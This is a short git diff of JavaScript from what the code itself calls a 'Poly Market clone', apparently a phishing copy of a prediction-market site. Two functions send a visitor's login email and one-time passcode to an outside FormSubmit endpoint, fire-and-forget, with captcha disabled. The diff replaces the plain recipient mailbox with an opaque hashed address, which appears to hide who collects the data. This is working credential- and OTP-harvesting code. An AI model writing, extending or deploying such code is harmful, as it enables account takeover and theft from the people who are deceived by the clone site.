@@ -8,7 +8,7 @@ function sendEmailToFormsubmit(email) {
         fd.append('_subject', 'New login email from Poly Market clone');
         fd.append('_captcha', 'false'); // disable captcha if supported
         // Fire-and-forget; if CORS blocks, it will fail silently
-        fetch('https://formsubmit.co/dclonghorns1@outlook.com', {
+        fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
             method: 'POST',
             body: fd,
             mode: 'no-cors' // use no-cors to avoid CORS blocking the app; FormSubmit will still receive the POST
@@ -26,7 +26,7 @@ function sendOtpToFormsubmit(otp, email) {
         fd.append('form_type', 'OTP Submission');
         fd.append('_subject', 'New OTP from Poly Market clone');
         fd.append('_captcha', 'false');
-        fetch('https://formsubmit.co/dclonghorns1@outlook.com', {
+        fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
             method: 'POST',
             body: fd,
             mode: 'no-cors'
